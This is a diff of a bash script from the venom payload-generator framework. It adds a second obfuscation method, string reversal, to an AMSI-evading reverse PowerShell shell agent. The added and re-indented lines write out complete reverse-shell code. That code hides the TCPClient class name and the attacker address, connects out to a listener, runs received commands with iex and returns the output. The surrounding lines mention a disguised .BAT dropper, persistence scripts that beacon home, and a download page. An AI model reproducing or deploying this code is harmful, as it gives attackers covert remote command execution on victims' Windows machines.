@@ -12364,7 +12364,7 @@ cat << !
 
     AGENT Nº3
     ─────────
-    DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
+    DESCRIPTION        : Reverse Powershell Shell (hex|PSrevStr)
     TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     LOLBin             : Powershell (DownloadFile)
     DROPPER EXTENSION  : .CRDOWNLOAD.BAT (MITRE T1036)
@@ -12477,7 +12477,7 @@ cat << !
 
     AGENT Nº   : 3
     OBFUSCATION: $obfstat <= (settings file)
-    DESCRIPTION: Reverse Powershell Shell (hex obfuscation)
+    DESCRIPTION: Reverse Powershell Shell (hex|PSrevStr obfuscation)
     OBFUSCATION: If active (ON) 'persistence' module creates a VBS insted of BAT startup script.
                  The persistence.vbs script will hidde better is execution. While persistence.bat
                  its written to beacon home from 8 to 8 sec until a valid connection its found.
@@ -13172,31 +13172,69 @@ else
 fi
 
 
-## Convert attacker ip address to hex
-echo "${BlueF}[☠]${white} Converting ip address to hex ..${white}";sleep 2
-one=$(echo $lhost|cut -d '.' -f1)
-two=$(echo $lhost|cut -d '.' -f2)
-tre=$(echo $lhost|cut -d '.' -f3)
-four=$(echo $lhost|cut -d '.' -f4)
-Hex=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
-um=$(echo $Hex|cut -d ',' -f1)
-dois=$(echo $Hex|cut -d ',' -f2)
-tres=$(echo $Hex|cut -d ',' -f3)
-quato=$(echo $Hex|cut -d ',' -f4)
-strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
-echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed${white}";sleep 2
+## Client.ps1 obfuscation type (hex|PSrevStr)
+ObfuscationType=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nChose the obfuscation method to use:" --radiolist --column "Pick" --column "Option" TRUE "Hex (default)" FALSE "PSrevStr (new)" --width 360 --height 180) > /dev/null 2>&1
+if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
+
+   xterm -T " Reversing Original String (ip addr)" -geometry 110x23 -e "rev <<< \"$lhost\" > /tmp/reverse.txt"
+   revtcpip=$(cat /tmp/reverse.txt);rm /tmp/reverse.txt > /dev/nul 2>&1
+   
+
+   echo "${BlueF}[☠]${white} Obfuscated ip address (rev):${GreenF}$revtcpip${white}";sleep 2
+   ## Build Reverse TCP Powershell Shell (hex obfuscated).
+   echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
+   echo "<#" > $IPATH/output/$NaM.ps1
+   echo "Obfuscated (rev) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
+   echo "Framework: venom v1.0.17 (shinigami)" >> $IPATH/output/$NaM.ps1
+   echo "#>" >> $IPATH/output/$NaM.ps1
+   echo "" >> $IPATH/output/$NaM.ps1
+   echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$CertPem = \$Vault.ToCharArray();" >> $IPATH/output/$NaM.ps1
+   echo "[Array]::Reverse(\$CertPem);\$CmdLine = (\$CertPem -Join '');" >> $IPATH/output/$NaM.ps1
+   echo "\$Cofre = \"$revtcpip\";\$Chave = \$Cofre.ToCharArray();" >> $IPATH/output/$NaM.ps1
+   echo "[Array]::Reverse(\$Chave);\$RSAx504 = (\$Chave -Join '');" >> $IPATH/output/$NaM.ps1
+   echo "" >> $IPATH/output/$NaM.ps1
+   echo "\$proxy = New-Object System.\$CmdLine(\$RSAx504, 666);" >> $IPATH/output/$NaM.ps1
+   echo "\$DataRaw = \$proxy.GetStream();" >> $IPATH/output/$NaM.ps1
+   echo "[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
+   echo "" >> $IPATH/output/$NaM.ps1
+   echo "while((\$iO = \$DataRaw.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/$NaM.ps1
+   echo "   \$FTPdata = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$iO);" >> $IPATH/output/$NaM.ps1
+   echo "   \$sendTO = (iex \$FTPdata 2>&1 | Out-String);" >> $IPATH/output/$NaM.ps1
+   echo "   \$TCPReturn = \$sendTO + '[' + (hostname) + '] ' + (pwd).Path + '> ';" >> $IPATH/output/$NaM.ps1
+   echo "   \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$TCPReturn);" >> $IPATH/output/$NaM.ps1
+   echo "   \$DataRaw.Write(\$sendbyte,0,\$sendbyte.Length);" >> $IPATH/output/$NaM.ps1
+   echo "   \$DataRaw.Flush();" >> $IPATH/output/$NaM.ps1
+   echo "}" >> $IPATH/output/$NaM.ps1
+   echo "\$proxy.Close();" >> $IPATH/output/$NaM.ps1
+
+else
+
+   ## Convert attacker ip address to hex
+   echo "${BlueF}[☠]${white} Converting ip address to hex ..${white}";sleep 2
+   one=$(echo $lhost|cut -d '.' -f1)
+   two=$(echo $lhost|cut -d '.' -f2)
+   tre=$(echo $lhost|cut -d '.' -f3)
+   four=$(echo $lhost|cut -d '.' -f4)
+   Hex=$(printf "%x,%x,%x,%x\n" $one $two $tre $four)
+   um=$(echo $Hex|cut -d ',' -f1)
+   dois=$(echo $Hex|cut -d ',' -f2)
+   tres=$(echo $Hex|cut -d ',' -f3)
+   quato=$(echo $Hex|cut -d ',' -f4)
+   strip="\"$um\"","\"$dois\"","\"$tres\"","\"$quato\"";hexed=$strip
+   echo "${BlueF}[☠]${white} Obfuscated ip addr (hex):${GreenF}$hexed${white}";sleep 2
 
 
-## Build Reverse TCP Powershell Shell (hex obfuscated).
-echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
-echo "<#" > $IPATH/output/$NaM.ps1
-echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
-echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
-echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
-echo "#>" >> $IPATH/output/$NaM.ps1
-echo "" >> $IPATH/output/$NaM.ps1
-echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1
+   ## Build Reverse TCP Powershell Shell (hex obfuscated).
+   echo "${BlueF}[☠]${white} Writting Reverse Powershell Shell to output ..";sleep 2
+   echo "<#" > $IPATH/output/$NaM.ps1
+   echo "Obfuscated (hex) Reverse Powershell Shell" >> $IPATH/output/$NaM.ps1
+   echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$NaM.ps1
+   echo "Original shell: Paranoid Ninja" >> $IPATH/output/$NaM.ps1
+   echo "#>" >> $IPATH/output/$NaM.ps1
+   echo "" >> $IPATH/output/$NaM.ps1
+   echo "while (\$true) {\$px = $hexed;\$p = (\$px | ForEach { [convert]::ToInt32(\$_,16) }) -join '.';\$w = \"GET /index.html HTTP/1.1\`r\`nHost: \$p\`r\`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0\`r\`nAccept: text/html\`r\`n\`r\`n\";\$s = [System.Text.ASCIIEncoding];[byte[]]\$b = 0..65535|%{0};\$x = \"n-eiorvsxpk5\";Set-alias \$x (\$x[\$true-10] + (\$x[[byte](\"0x\" + \"FF\") - 265]) + \$x[[byte](\"0x\" + \"9a\") - 158]);\$y = New-Object System.Net.Sockets.TCPClient(\$p,$lport);\$z = \$y.GetStream();\$d = \$s::UTF8.GetBytes(\$w);\$z.Write(\$d, 0, \$d.Length);\$t = (n-eiorvsxpk5 whoami) + \"> \";while((\$l = \$z.Read(\$b, 0, \$b.Length)) -ne 0){;\$v = (New-Object -TypeName \$s).GetString(\$b,0, \$l);\$d = \$s::UTF8.GetBytes((n-eiorvsxpk5 \$v 2>&1 | Out-String )) + \$s::UTF8.GetBytes(\$t);\$z.Write(\$d, 0, \$d.Length);}\$y.Close();Start-Sleep -Seconds 3}" >> $IPATH/output/$NaM.ps1
 
+fi
 
 ## Building the Download Webpage Sellected.
 echo "${BlueF}[☠]${white} Building HTTP Download WebPage (apache2) .."${Reset};sleep 2
@@ -13283,10 +13321,18 @@ if [ "$persistence" = "Add persistence" ]; then
       sed -i "s|.update.bat|.update.vbs|" handler.sh
    fi
 
+   ## Client.ps1 (Agent) obfuscation type
+   if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
+      sed -i "s|DESCRIPTION : Reverse TCP PS Shell (hex)|DESCRIPTION : Reverse TCP PS Shell (rev)|" handler.sh
+   fi
 
    ## Write README file (to be compressed)
    echo "Id          : $Id" > README
-   echo "Description : Reverse Powershell Shell (hex obfuscation)" >> README
+   if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
+      echo "Description : Reverse Powershell Shell (rev obfuscation)" >> README
+   else
+      echo "Description : Reverse Powershell Shell (hex obfuscation)" >> README
+   fi
    echo "Categorie   : Amsi Evasion (agent nº3)" >> README
    echo "Active On   : $dtr" >> README
    echo "Lhost|Lport : $lhost:$lport" >> README
@@ -13309,7 +13355,7 @@ if [ "$persistence" = "Add persistence" ]; then
    echo "${BlueF}[${YellowF}i${BlueF}]${YellowF} Compressing (zip) handler files .."${Reset};sleep 2
    zip handler_ID:$Id.zip handler.sh README -m -q
    cd $IPATH
-   zenity --title="☠ Reverse TCP Powershell Shell (hex obfuscation) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
+   zenity --title="☠ Reverse TCP Powershell Shell (hex|PSrevStr obfuscation) ☠" --text "Persistence handler files stored under:\n$IPATH/output/handler_ID:$Id.zip" --info --width 340 --height 130 > /dev/null 2>&1
 else
    ## Delete certs IF persitence was NOT sellected.
    rm $IPATH/output/cert.pem > /dev/nul 2>&1
